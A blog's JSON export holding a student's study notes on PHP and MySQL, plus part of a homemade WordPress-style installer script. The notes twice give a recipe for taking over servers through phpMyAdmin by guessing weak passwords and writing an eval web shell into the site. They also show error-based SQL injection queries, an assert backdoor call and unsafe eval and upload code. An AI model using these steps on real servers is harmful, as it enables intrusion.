{"meta":{"title":"Jaychouzzk's blogs","subtitle":null,"description":null,"author":"Jaychouzzk","url":"https://jaychouzzk.github.io"},"pages":[{"title":"about","date":"2018-12-04T00:47:39.000Z","updated":"2018-12-04T00:47:39.469Z","comments":true,"path":"about/index.html","permalink":"https://jaychouzzk.github.io/about/index.html","excerpt":"","text":""},{"title":"学习笔记","date":"2018-12-04T00:47:58.000Z","updated":"2018-12-04T01:28:30.991Z","comments":false,"path":"categories/index-1.html","permalink":"https://jaychouzzk.github.io/categories/index-1.html","excerpt":"","text":""},{"title":"categories","date":"2018-12-03T11:33:07.000Z","updated":"2018-12-04T01:20:57.141Z","comments":false,"path":"categories/index.html","permalink":"https://jaychouzzk.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-03T11:31:34.000Z","updated":"2018-12-04T01:00:18.729Z","comments":true,"path":"tags/index.html","permalink":"https://jaychouzzk.github.io/tags/index.html","excerpt":"","text":""},{"title":"guestbook","date":"2018-12-04T00:48:21.000Z","updated":"2018-12-04T00:48:21.937Z","comments":true,"path":"guestbook/index.html","permalink":"https://jaychouzzk.github.io/guestbook/index.html","excerpt":"","text":""},{"title":"Python","date":"2018-12-04T00:47:15.000Z","updated":"2018-12-04T01:00:25.182Z","comments":true,"path":"tags/index-1.html","permalink":"https://jaychouzzk.github.io/tags/index-1.html","excerpt":"","text":""}],"posts":[{"title":"php简陋实现wordpress安装流程","slug":"第四周笔记","date":"2018-12-23T06:58:31.955Z","updated":"2018-12-23T07:36:26.069Z","comments":true,"path":"2018/12/23/第四周笔记/","link":"","permalink":"https://jaychouzzk.github.io/2018/12/23/第四周笔记/","excerpt":"","text":"第四周周一PHP表单处理： 超全局变量$_POST $_GET $_REQUEST 他们都是数组 $_POST 提交表单 提交方式method=”POST” 提交name=”username” value=”1” &lt;input type=”submit” name=”submit”&gt; 接收： $user=$_POST[&quot;username&quot;] $submit=$_POST[&quot;submit&quot;] 跳转： PHP跳转 header(&quot;Location: login.php&quot;); JS跳转 echo &apos;&amp;lt;script&amp;gt;location.href=&quot;install.php&quot;;&amp;lt;/script&amp;gt;&apos; $_GET: 发送 &lt;a href=””&gt;登录&lt;/a&gt; 接收 : $id=$_GET[&apos;name&apos;] echo $id; $_REQUEST: 能接收POST和GET两种数据 PHP文件操作（filesystem函数）： fread()函数读取打开的文件 fwrite（）函数写入一个打开的文件 unlink（）函数删除文件 is_dir检查文件是否是目录 is_file()检查是否常规文件 file_exists（）检查文件是否存在 copy（）复制文件 rename（）重命名文件或目录 file_get_contents(文件名) 读取整个文件内容，***打开远程文件*** php://filter file_get_contents() echo file_get_contents(&quot;http://www.baidu.com&quot;) file_put_contents(文件名) 覆盖写入文件 $f=fopen(&apos;login.php&apos;,&apos;r&apos;);//打开一个文件 指向开头 echo fgets($f); //读一行 feof($f) ; //检测是否到文件末尾 while (!feof($f)){ //用while循环输出文件内容 直到文件末尾 echo fgets($f); //输出每行的内容 } fclose($f); PHP文件打开方式 r 只读，在开头开始 r+ 读写，在开头开始 w 只写，清空内容，如果不存在创建新文件 w+ 读写，清空文件，不存在则创建新文件 a 追加 在末尾进行写操作，可以创建新文件 a+ 读或追加 末尾写内容 x 只写（新建） x+ 读写（新建） //X-Forwarded-For火狐的header插件（记录网站IP） //display_error关闭网站就不会报错 PHP中的代码执行： eval(&quot;&quot;) 例子：eval(&quot;echo 123;\\$a=&apos;aaa&apos;;&quot;); echo $a; //结果123aaa eval(&quot;\\$a=Array();&quot;); //字符串转换成代码执行 print_r($a); preg_replace(&quot;a/123/e&quot;,&apos;$c=123&apos;,&quot;abab&quot;); //第一个路径后有e 则第二个代码能被执行 $func = create_function(&apos;&apos;,&apos;代码&apos;) $_GET[&apos;a&apos;]($_GET[&apos;b&apos;]); 课堂实验：制作一个eval计算器 &amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt; 请输入要计算的内容： &amp;lt;input type=&quot;text&quot; name=&quot;eval&quot; value=&quot;Rg:1+2-3&quot;&amp;gt; &amp;lt;input type=&quot;submit&quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;?php @$eval=($_POST[&apos;eval&apos;]); if ($eval){ @eval(&quot;\\$res=$eval;&quot;); echo &quot;结果是：$res&quot;; } ?&amp;gt; PHP命令执行： exec(“dir-l ~/“,$output); //output用来反馈结果 print_r（$output）; system(&quot;命令&quot;) //不需要接收 @output=shell_exec(&quot;whoami&quot;,$output); print_r($output); popen() 打开一个进程 $_GET‘a’ 5.6以下 a = assert&amp;b = phpinfo() 7 a = assert&amp;b = phpinfo() 会报assert参数错误，不能为动态变量 file操作 fopen 打开方式： r w a x fclose 关闭文件 fgets 获取一行的数据 feof 判断是否到文件结尾 结合while读取内容 while(!feof($f)){ echo $fgets($f);} fread 读取文件内容，需要指定$f的长度 fwrite 写内容，需要指定$f和写入字符串 is_file is_dir file_exists unlink copy remname file_get_contents (‘./data/123.txt’);file_get_contents (‘./data/123.txt’,’abcdef’); eval eval(‘echo 123;’) eval(“$a = 123;”) eval(“\\$arr = [‘name’=&gt;zs]”) 计算器： eval(“\\$res = $_POST[‘str’];”) echo $res; 执行系统命令的函数：execexec(‘dir’,$output);print_r($output); systemsystem(‘whoami’); shell_exec$outpu = shell_exec(‘ipconfig’);print_r($outpu); popen(有小问题)$f = popen(“dir”,”r”);echo fread($f , 1000);pclose($f); 周二文件包含： include ‘show.php’;//只会警告，脚本继续require ‘show.php’;//会产生致命错误，停止脚本 include_oncerequire_once include 在php文件开始运行的时候就包含，复制的位置还是关键字的地方require 在执行到require关键字的时候才包含 一般用于包含导航栏，包含配置文件 Cookie： setcookie(name,value,expire:time()+过期时间); 防止伪造cookie 生成cookie$tmp = rand(1,1000); $tmp = $uname . $tmp . time(); $tmp = md5($tmp); $f = fopen($tmp, ‘a’); fwrite($f,$uname); fclose($f); setcookie(‘id’, $tmp, time()+50);校验cookie@$id = $_COOKIE[‘id’] if(file_exists(‘./data/session_’ . $id)){ $f = fopen(&apos;./data/session_&apos; . $id , &apos;r&apos;); $uname = fgets($f); fclose($f); } Session $_SESSION（超全局变量，信息存储于服务器硬盘当中）： session_start() //启用session $_SESSION[‘name’] = ‘zs’ //存入用户名 if(isset($_SESSION[‘name’])){ //判断是否存在} session_destroy() //清空session缓存 跳转：header(“Location: show.php”); &lt;script&gt;location.href=’show.php’&lt;/script&gt; &lt;script&gt;location.navigate=’show.php’&lt;/script&gt;//待测 &lt;script&gt;top.location=’show.php’&lt;/script&gt; &lt;script&gt;self.location=’show.php’&lt;/script&gt; &lt;script&gt;location.replace=’show.php’&lt;/script&gt; &lt;meta http-equiv=refresh content=0;URL=’show.php’&gt;上传文件：&lt;form enctype=”multipart/form-data” method=”post”&gt; &lt;input type=”file” name=””&gt; &lt;input type=”submit”&gt; &lt;/form&gt;if (isset($_FILES[‘filename’])){ if($_FILES[‘filename’][‘error’] == 0){ echo ‘文件的名字是：’ . $_FILES[‘filename’][‘name’] . “&lt;br&gt;”; echo ‘类型是：’ . $_FILES[‘filename’][‘type’] . “&lt;br&gt;”; echo ‘大小是：’ . $_FILES[‘filename’][‘size’] . “&lt;br&gt;”; echo ‘临时目录是：’ . $_FILES[‘filename’][‘tmp_name’] . “&lt;br&gt;”; 读写 //$data = file_get_contents($_FILES[‘filename’][‘tmp_name’]); //file_put_contents(‘./data/‘ . $_FILES[‘filename’][‘name’],$data); 拷贝 //copy($_FILES[‘filename’][‘tmp_name’],’./data/‘ . $_FILES[‘filename’][‘name’]); 一般是用剪切，而不用copy和读写剪切 $ok = move_uploaded_file($_FILES[‘filename’][‘tmp_name’],’./data/‘ . $_FILES[‘filename’][‘name’]); if ($ok){ echo &apos;上传的路径为：./data/&apos; . $_FILES[&apos;filename&apos;][&apos;name&apos;]; }else{ echo &apos;上传失败&apos;; } }else{ echo &apos;上传失败&apos;; die(); } } 数据库:一个用来存放数据的服务，或者平台。要么以结构化（数据库、表、数据）的形式存在，要么以非结构化（key =&gt; value）的形式存放。 结构化：学生库（stu_db）–&gt;学生表（stu_table）–&gt;id、 name、 number、 class 1 hu 21100 95 2 xi 21351 96 非结构化：students_1.txtid = 1name = hunumber = 21100class = 95 mysql(轻量级开源数据库，适用于中小型企业，性能较好)sql server(微软开发的，适用于大中型企业，需要微软的系统作为支撑，不支持跨平台)oracle(收费，适用于大型企业，可跨平台，需要硬件配置高) 数据库模型： 关系型数据库（结构化）：mysql/mssql oracle DB2 非关系型数据库（非结构化）：redis mongodb hbase neo4j nosql PHPstudy(WAMP) mysql 配置环境变量 dos窗口登陆mysql -&gt; mysql -h -uroot -proot mysql交互窗口mysql-front 开源的数据库管理器phpmyadmin 基于网页的数据库管理器 mysql默认端口3306打开数据库管理器，数据库–&gt;数据表–&gt;字段（表头）表中有几个字段就有几列数据一行数据 专业称为 记录 mysql基础命令： mysql -h ip -u 用户名 -p 密码 show databases; 查看所有数据库 use test; 使用指定数据库 show tables; 查看数据库内的表 select * from news; 从news表中查看所有的数据内容 select 查看数据 * 表示所有字段 from news 从* *表中去获取数据 mysql修改密码： 低版本（5.x） 高版本（8.x） ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED BY &quot;你的新密码&quot;; mysql默认情况下不允许外连，也就意味使用mysql-front、navicat是无法连接到数据库的 mysql外连： （1）改表法 update user set host = “%” where user = “root” and host = “localhost”;//修改数据表 （2） mysql函数： select version(); 显示数据库的版本信息 select user(); 当前用户 select current_user()/session_user()/system_user(); mid(); 用来截取字符串中的一部分 mid(&quot;ichunqiu&quot;,0,2) ord(); 用来显示字符的ASCII码 concat(); 用来拼接字符串 concat_ws(); 使用分隔符来拼接字符串 group_concat(); 和concat类似，拼接并分组显示数据 select databases()/schema(); 查看当前数据库 select @@hostname; 获取计算机名称 select @@tmpdir; 获取临时文件目录路径 select @@datadir; 真正存放数据的路径 select @@version; 版本 select @@basedir; 数据库所在位置 创建数据库 create database ichunqiu; //交互式窗口 mysqladmin -uroot -proot create ichunqiu2 //dos窗口 删除数据库 drop database ichunqiu; mysqladmin -uroot -proot drop ichunqiu2 选择使用哪个数据库 use 数据库名称 数据类型： int，float，date，time，timestamp（时间戳），char，varchar，text 创建表 create table stu(id int , name varchar(10)); create table 表名（字段名1 类型1，字段名2 类型2，……）; show create table stu; desc 表名 查看字段 show create table 表名;—-注意：IF NOT EXISTS 表示如果创建的表不存在就执行后续sql语句—- –&gt;上引号 插入数据 insert into 表名 (字段1，字段2，字段3…,字段名n) value(value1,value2,….,valuen) —字段1对应value1— 查询数据 select 字段名1，字段名2,……，字段名n from 表名； select from 表名； select username,password from users where id=1;（单条件） select from stu where number=311009050115 and name=huqianwei;(多条件) select 字段名1，字段名2，….，字段名n from 表名 limit 0,1; –limit a,b 是用来限制读取记录，a是索引，b表示读取的行数– 更新数据 update 表名 set 字段名=新值1，字段名2=新值2，…,字段名n=新值n; update 表名 set 字段名=新值1，字段名2=新值2，…,字段名n=新值n where; 删除数据 delete from 表名 where 条件 ； delete from 表名; 删除表中所有数据 like子句 * 表示任意的字符 % 表示任意的字符 ? 表示一个字符 select * from stu where 字段名 like &quot;字符串&quot;； union 联合查询 select from 表1 union select from 表2; 注意:表1和表2中字段个数要保持一致 order by 条件 根据条件排序 select * from 表名 order by 字段名 asc/desc; —asc 升序，desc 降序— order by n ,按照第n列的数据进行排序，如果n超过了字段数量是，就会报错 group by 对结果进行分组 删除字段 alter table 表名 drop 字段名; 在表中将某个字段删掉 修改字段 alter table 表名 modify 字段名 字段类型; 添加字段 alter table 表名 add 字段名1 字段类型1,add 字段名2 字段类型2; 在表中增加某个字段 修改表名 alter table 原表名 rename to 新表名; mysql导入数据 (1)mysql -u 用户名 -p 密码 &lt; 要导入的数据库数据 注意：runoob.sql中要自动创建数据库 如果runoob.sql中不会自动创建数据库，需要执行如下的步骤： step1：登录数据库mysql -u用户名 -p密码 step2：选择数据库 use mysql; step3：source 绝对路径 (2)mysqlimport -u root -p –local database_name dump.txt 注意：dump.txt不会创建数据库时，需要database_name mysql导出数据 select * from news into outfile “绝对路径”; show global variables like ‘%secure_file_priv%’; 临时修改：set global secure_file_priv=’’; (1)为null时，表示mysql不允许导入导出 (2)为路径时，只允许在路径中导入导出 (3)为无值时，表示不做限制 脱裤： mysqldump -uroot -proot test&gt;D://database.sql脱裤中的表： mysqldump -uroot -proot mysql stu &gt;D://database2.sql 通过phpmyadmin 来获取服务器权限： step1：首先通过Googlehacking找到phpmyadmin的网站 step2：爆破、弱口令，登录，查看权限，show global variables like ‘%secure_file_priv%’; step3：select “&lt;?php eval($_POST[‘pass’]);?&gt;” into outfile “G://“,注意写入木马的路径 选择数据的高级用法： order by 数字; —-&gt;可以用来暴字段数 select 1+1#1+1; select 1+1;–1+1 select connection_id(); 用户连接数 select insert(被替换的的字符串,索引,长度,替换的字符串); select left(被截取的字符串，截取的长度); 向左截取 select right(被截取的字符串，截取的长度); 向右截取 select substring/mid/substr(); 都是三个参数，第一个被截取的字符串，第二个是开始位置，第三个是截取的长度 select sleep(5); 让数据库等待5s后返回0 2个报错函数 extractvalue(XML_document，XPath_string): 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string(Xpath格式为字符串) 作用：从目标XML中返回包含所查询值的字符串 select * from user where user=&apos;root&apos; and extractvalue(1,concat(0x7e,(select user()),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos; select * from user where user=&apos;root&apos; and extractvalue(1,concat(0x7e,(select @@datadir),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &apos;~D:\\phpstudy\\PHPTutorial\\MySQL\\d&apos; concat(0x7e,(select user()),0x7e) updatexml(xml_document,xpath,) 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 select * from user where user =&apos;root&apos;and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos; distinct去重： SELECT DISTINCT 字段 FROM 表名 WHERE 条件； group_concat把查询结果连接到一起： SELECT group_concat(DISTINCT 字段) FROM 表名 WHERE 条件 ； SELECT group_concat(字段，字段) FROM 表名 WHERE 条件 ； ubuntu16 mysql 安装： 安装的时候会提示要设置root密码，如果你没有在卸载的时候去清理残留数据是不会提示你去设置root密码的 ，我的就没提示，可以用上面的方法修改密码 sudo apt-get install mysql-client mysql-server #检查mysql是不是在运行 sudo service mysql status #一般安装完成之后都是会自动运行的，如果没有运行可以start sudo service mysql start 修改密码： update user set authentication_string=PASSWORD(&quot;密码&quot;) where user = &quot;root&quot;; update user set plugin=&quot;mysql_native_password&quot;; flush privileges; quit; 重启mysql /etc/init.d/mysql restart; 卸载mysql： sudo apt purge mysql-* sudo rm -rf /etc/mysql/ /var/lib/mysql sudo apt autoremove PHP连接mysql数据库 (1)使用mysqli去连接 mysqli_connect(&quot;IP&quot;,&quot;pwd&quot;) create table if not exists `te`(`id` int auto_INCREMENT,`name` varchar(100) not null,`age` int(100) not null,`gender` bool,PRIMARY KEY (`id`)) 周四往表中插入数据： insert into 表名称(字段1，字段2...) value(字段1的值，字段2的值...) 例子：insert into news(title,content) value(&apos;标题&apos;,&apos;内容‘)； 查询数据： select 字段名1,字段名2,...,字段名n from 表名称 select username,password from user where id =1;单条件 select * from stu where number=31100 and name=hu;多条件用and连接 select 字段1，字段2，字段n from 表名 limit 0,1；用limit加限制条件 从0开始读1条 limit a,b limit---限制读取记录 a---索引 b----记录数 更新： update 表名 set 字段1=新值1，字段2=新值2 条件； 删除表： delete from 表名 条件；一定要加好条件，否则都删了 delete from 表名；清空一个表 like子句： 通配符： *表示任意的字符 %表示任意的字符 ？表示任意一个字符 select * from 表名 where name like &apos;%sd&apos;; union*** 联合查询 select * from 表1 union select * from 表2；把表1和表2内容放在一起展示 注意：表1和表2中字段个数要保持一致，否则会报错 order by 条件*** 根据条件排序 select * from user where city =&apos;beijng&apos; order by name; ASC（升序） 或DESC（降序）默认升序 order by 1\\2\\3.。。 根据第几列来排序，如果超过列数就会报错***** group by 根据一个或多个列对结果进行分组，常和count sum、AVG组合使用 select name，count（*）from emply by name；根据名字来给表分组； 删除字段： alter table 表名 drop 字段名；在表中将某个字段删除 增加字段： alter table 字段名 add 字段名 字段类型 改字段： alter table to modify 字段名 字段类型; 改表名： alter table 原表名 rename to 新表名; 导入数据： 方法1.mysql -uroot -p 密码 &amp;lt; 要导入的数据（注意：.sql中要自动创建数据库，如果runoob.sql中不会自动创建数据库，需要用第二种方法） 方法2.登录mysql，use数据库，source 路径文件 方法3.mysqlimport -uroot -p --local database_name dump.txt dump.txt（注意：dump.txt不会创建数据库时，需要database_name） 导出数据： 方法1.select * from 表名 into outfile 文件路径； 在此导出权限查询：show gloval variables like &apos;%secure%&apos;; 在mysql.ini中添加一句话secure_file_priv= 或者临时修改权限set global secure_file_priv=&apos;&apos;; 通过phpmyadmin来获取服务器权限：（getshell） step1：首先通过google hacking找到phpmyadmin网站 step2：想办法登录进phpmyadmin，弱口令登录 show global variables like ‘%secure_file_priv%&apos;;判断是否有权限写入文件 step3：select ’&amp;lt;?php eval($_POST[_]);?&amp;gt;&apos; into outfile &apos;g://re2.txt&apos;； 注意些木马的路径 一般是/var/www/html/ 方法2.在cmd中mysqldump -uroot -p test&amp;gt;./database.sql mysqldump -u用户名 -p密码 数据库名 表名 &amp;gt;路径 注释**注入 #（%23） -- 注释当前行 /* */ 中间注释 查询用户连接数 select connection_id(); 替换字符 例子 select insert(&apos;ichunqiu&apos;,1,1,&apos;kk&apos;);结果是kkchunqiu 截取字符串 例子 select LEFT(&quot;helloworld&quot;,5);结果是hello select LEFT（被截取的字符串，左截取长度）; select RIGHT 同理 截取 select substring()/mid()/substr()都是三个参数，第一个：被截取的字符串，第二个：开始的位置，第三个：截取的长度 休息命令 select sleep(时间秒) 例子select sleep（5）;返回0 //让服务器等待5秒后返回0 2个报错函数*** 一般情况下要放在条件后面 1.extractvalue(XML_document，XPath_string)； 例子： select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e)); 两个参数（1，拼接的第二个报错参数） 2.UPDATEXML (XML_document, XPath_string, new_value); updatexml（1，拼接参数，1）； 去重函数 select distinct title from news;不显示重复函数 把查询结果连接在一起 group_concat(DISTINCT field) from table_name where conditions; PHP连接mysql数据库 方法1：使用mysqli扩展连接(面向对象) &amp;lt;?php $dbhost = &apos;localhost:3306&apos;; // mysql服务器主机地址 $dbuser = &apos;root&apos;; // mysql用户名 $dbpass = &apos;123456&apos;; // mysql用户名密码 $conn = mysqli_connect($dbhost, $dbuser, $dbpass); if(! $conn ) { die(&apos;连接失败: &apos; . mysqli_error($conn)); } // 设置编码，防止中文乱码 mysqli_query($conn , &quot;set names utf8&quot;); $sql = &apos;SELECT runoob_id, runoob_title, runoob_author, submission_date FROM runoob_tbl&apos;; mysqli_select_db( $conn, &apos;RUNOOB&apos; ); $retval = mysqli_query( $conn, $sql ); if(! $retval ) { die(&apos;无法读取数据: &apos; . mysqli_error($conn)); } echo &apos;&amp;lt;h2&amp;gt;菜鸟教程 mysqli_fetch_array 测试&amp;lt;h2&amp;gt;&apos;; echo &apos;&amp;lt;table border=&quot;1&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;教程 ID&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;标题&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;作者&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;提交日期&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&apos;; while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) { echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; {$row[&apos;runoob_id&apos;]}&amp;lt;/td&amp;gt; &quot;. &quot;&amp;lt;td&amp;gt;{$row[&apos;runoob_title&apos;]} &amp;lt;/td&amp;gt; &quot;. &quot;&amp;lt;td&amp;gt;{$row[&apos;runoob_author&apos;]} &amp;lt;/td&amp;gt; &quot;. &quot;&amp;lt;td&amp;gt;{$row[&apos;submission_date&apos;]} &amp;lt;/td&amp;gt; &quot;. &quot;&amp;lt;/tr&amp;gt;&quot;; } echo &apos;&amp;lt;/table&amp;gt;&apos;; mysqli_close($conn); ?&amp;gt; 或者写成m面向对象： &amp;lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); $mysql_conf=array(&apos;host&apos;=&amp;gt;&apos;127.0.0.1&apos;,&apos;username&apos;=&amp;gt;&apos;root&apos;,&apos;password&apos;=&amp;gt;&apos;root&apos;,&apos;database&apos;=&amp;gt;&apos;test&apos;,);//定义的数组 =&amp;gt; $mysqli=new mysqli($mysql_conf[&apos;host&apos;],$mysql_conf[&apos;username&apos;],$mysql_conf[&apos;password&apos;]);//连接数据库 //new 对象，实例化 if ($mysqli-&amp;gt;connect_error) { die(&quot;not connect to database server&quot;.$mysqli-&amp;gt;connect_error);//connect_error该变量存储连接服务时的错误信息，若没有，则说明连接成功 } $mysqli-&amp;gt;query(&quot;set names &apos;utf8&apos;&quot;);//设置编码方式 $db=$mysqli-&amp;gt;select_db($mysql_conf[&apos;database&apos;]);//选择数据库 if (!$db) { die(&apos;not connect to the db&apos;.$mysqli-&amp;gt;error);//error变量存储连接数据库的错误信息， } $sql=&quot;select * from news where tid=1&quot;; //这是要执行的sql语句 $conn=$mysqli-&amp;gt;query($sql);//执行sql语句 //var_dump($conn); if (!$conn) { die(&apos;sql is error&apos;.$mysqli-&amp;gt;error); } while ($row=$conn-&amp;gt;fetch_array(MYSQLI_ASSOC)) {//fetch_assoc该方法将执行完sql语句的结果转换为数组 //var_dump($row); echo &quot;&amp;lt;pre&amp;gt;&quot;; //print_r($row); echo $row[&apos;content&apos;]; echo &quot;&amp;lt;/pre&amp;gt;&quot;; } $conn-&amp;gt;free();//释放执行sql语句的资源 $mysqli-&amp;gt;close();//释放连接数据库服务的资源 // mysqli_fetch_assoc(), 该函数从结果集中取得一行作为关联数组 ,返回根据从结果集取得的行生成的关联数组，如果没有更多行，则返回 false。 // mysqli_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。 执行数据库语句（成功返回0，失败返回1） $result=mysqli_query($conn,$create_db_sql); 方法2：使用mysql扩展（php低于5.5） 方法3：使用PDO技术（面向对象的，防止sql注入）接下一篇： 周五方法3：使用PDO技术（面向对象的，防止sql注入） $mysql_conf=array( &apos;host&apos;=&amp;gt;&apos;127.0.0.1:3306&apos;, &apos;db&apos;=&amp;gt;&apos;test&apos;, &apos;db_user&apos;=&amp;gt;&apos;root&apos;, &apos;db_pwd&apos;=&amp;gt;&apos;123456&apos;, ); //$pdo = new PDO(&quot;mysql:host=&quot;.$mysql_conf[&apos;host&apos;].&quot;;dbname=&quot;.$mysql_conf[&apos;db&apos;],&quot;db_user=&quot;.$mysql_conf[&apos;db_user&apos;],&quot;db_pwd=&quot;.$mysql_conf[&apos;db_pwd&apos;]); $pdo = new PDO(&quot;mysql:host=&quot; . $mysql_conf[&apos;host&apos;] . &quot;;dbname=&quot; . $mysql_conf[&apos;db&apos;], $mysql_conf[&apos;db_user&apos;], $mysql_conf[&apos;db_pwd&apos;]);//$dsn = &quot;mysql:dbname=test;host=127.0.0.1&quot;; $pdo-&amp;gt;exec(&quot;set names &apos;utf8&apos;&quot;); $sql=&quot;select * from food where id=3&quot;; $stmt=$pdo-&amp;gt;prepare($sql); $stmt-&amp;gt;bindValue(1,&apos;1&apos;,PDO::PARAM_STR); $rs=$stmt-&amp;gt;execute(); if ($rs){ while ($row=$stmt-&amp;gt;fetch(PDO::FETCH_ASSOC)){ var_dump($row); } } $pdo=null; ?&amp;gt;","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://jaychouzzk.github.io/tags/PHP/"},{"name":"Mysql","slug":"Mysql","permalink":"https://jaychouzzk.github.io/tags/Mysql/"}]},{"title":"php简陋实现wordpress安装流程","slug":"php简陋实现wordpress安装流程","date":"2018-12-16T14:33:02.776Z","updated":"2018-12-16T14:43:15.738Z","comments":true,"path":"2018/12/16/php简陋实现wordpress安装流程/","link":"","permalink":"https://jaychouzzk.github.io/2018/12/16/php简陋实现wordpress安装流程/","excerpt":"","text":"anzhuang.php&lt;?php /** * Created by PhpStorm. * User: Administrator * Date: 2018/12/15 * Time: 17:20 */ $step =0; @$step = $_POST[&apos;step&apos;]; @$language = $_POST[&apos;language&apos;]; /*@$sqlname= $_POST[&apos;sqlname&apos;]; @$username = $_POST[&apos;username&apos;]; @$passwd = $_POST[&apos;passwd&apos;]; @$sqlhost = $_POST[&apos;sqlhost&apos;]; @$tbname = $_POST[&apos;tbname&apos;];*/ $_POST[&apos;sqlname&apos;] = &quot;wordpress&quot;; $_POST[&apos;username&apos;] = &quot;root&quot;; $_POST[&apos;passwd&apos;] = &quot;root&quot;; $_POST[&apos;sqlhost&apos;] = &quot;localhost&quot;; $_POST[&apos;tbname&apos;] = &quot;wp_&quot;; @$uname = $_POST[&apos;uname&apos;]; @$upasswd = $_POST[&apos;upasswd&apos;]; if ($step == 0){ step0(); } if($step == 1){ step1(); } if($step == 2 ){ step2(); } if($step == 3 ) { step3(); } if($step == 5){ successful(); } if($step == 6){ success(); } if ($step == 7){ wordpress(); } //开始页面 function step0(){ $step1 = &lt;&lt;&lt;EOF &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;style&gt; &lt;/style&gt; &lt;body style=&quot;text-align: center;&quot;&gt; &lt;form action=&quot;anzhuang.php&quot; method=&quot;post&quot;&gt; &lt;h1&gt;WordPress&lt;/h1&gt; &lt;button type=&quot;submit&quot; name=&quot;step&quot; value=&quot;1&quot;&gt;开始安装&lt;/button&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; echo $step1; } //第一步--&gt;选择安装语言 function step1(){ $step1 = &lt;&lt;&lt;EOF &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;style&gt; &lt;/style&gt; &lt;body style=&quot;text-align: center;&quot;&gt; &lt;form action=&quot;anzhuang.php&quot; method=&quot;post&quot;&gt; &lt;h1&gt;请选择安装语言：&lt;/h1&gt; &lt;select name=&quot;language&quot;&gt; &lt;option value=&quot;ysyy&quot;&gt;英式英语&lt;/option&gt; &lt;option value=&quot;zhjt&quot;&gt;中文简体&lt;/option&gt; &lt;option value=&quot;msyy&quot;&gt;美式英语&lt;/option&gt; &lt;option value=&quot;zhft&quot;&gt;中文繁体&lt;/option&gt; &lt;/select&gt; &lt;button type=&quot;submit&quot; name=&quot;step&quot; value=&quot;2&quot;&gt;下一步&lt;/button&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; echo $step1; } //第二步 function step2(){ $step1 = &lt;&lt;&lt;EOF &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;style&gt; &lt;/style&gt; &lt;body style=&quot;text-align: center;&quot;&gt; &lt;form action=&quot;anzhuang.php&quot; method=&quot;post&quot;&gt; &lt;p&gt;欢迎使用&lt;/p&gt; &lt;li&gt;数据库名&lt;/li&gt; &lt;li&gt;数据库用户名&lt;/li&gt; &lt;li&gt;数据库密码&lt;/li&gt; &lt;li&gt;数据库主机&lt;/li&gt; &lt;li&gt;数据表前缀（table prefix，特别是当您要在一个数据库中安装多个WordPress时）&lt;/li&gt; &lt;p&gt;我们会使用这些信息来创建一个&lt;code&gt;wp-config.php&lt;/code&gt;文件。 &lt;strong&gt;如果自动创建未能成功，不用担心，您要做的只是将数据库信息填入配置文件。您也可以在文本编辑器中打开&lt;code&gt;wp-config-sample.php&lt;/code&gt;，填入您的信息，并将其另存为&lt;code&gt;wp-config.php&lt;/code&gt;。&lt;/strong&gt; 需要更多帮助？&lt;a href=&quot;https://codex.wordpress.org/zh-cn:%E7%BC%96%E8%BE%91_wp-config.php&quot;&gt;看这里&lt;/a&gt;。&lt;/p&gt; &lt;p&gt;绝大多数时候，您的网站服务提供商会给您这些信息。如果您没有这些信息，在继续之前您将需要联系他们。如果您准备好了…&lt;/p&gt; &lt;button type=&quot;submit&quot; name=&quot;step&quot; value=&quot;3&quot;&gt;现在就开始！&lt;/button&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; EOF; echo $step1; } //第三步--&gt;填写基本信息，如果与数据库进行比对，出现错误跳转errorsql(). function step3(){ $step1 = &lt;&lt;&lt;EOF &lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;style&gt; &lt;/style&gt; &lt;body style=&quot;text-align: center;&quot;&gt; &lt;form action=&quot;jiaoyan.php&quot; method=&quot;post&quot;&gt; &lt;p&gt;请在下方填写您的数据库连接信息:&lt;/p&gt; &lt;p&gt;数据库名&lt;input type=&quot;text&quot; name=&quot;sqlname&quot; value=&quot;wordpress&quot;&gt;&lt;/p&gt; &lt;p&gt;用户名&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;root&quot;&gt;&lt;/p&gt; &lt;p&gt;密码&lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;root&quot;&gt;&lt;/p&gt; &lt;p&gt;数据库主机&lt;input type=&quot;text&quot; name=&quot;sqlhost&quot; value=&quot;localhost&quot;&gt;&lt;/p&gt; &lt;p&gt;表前缀&lt;input type=&quot;text&quot; name=&quot;tbname&quot; value=&quot;wp_&quot;&gt;&lt;/p&gt; &lt;button type=&quot;submit&quot; 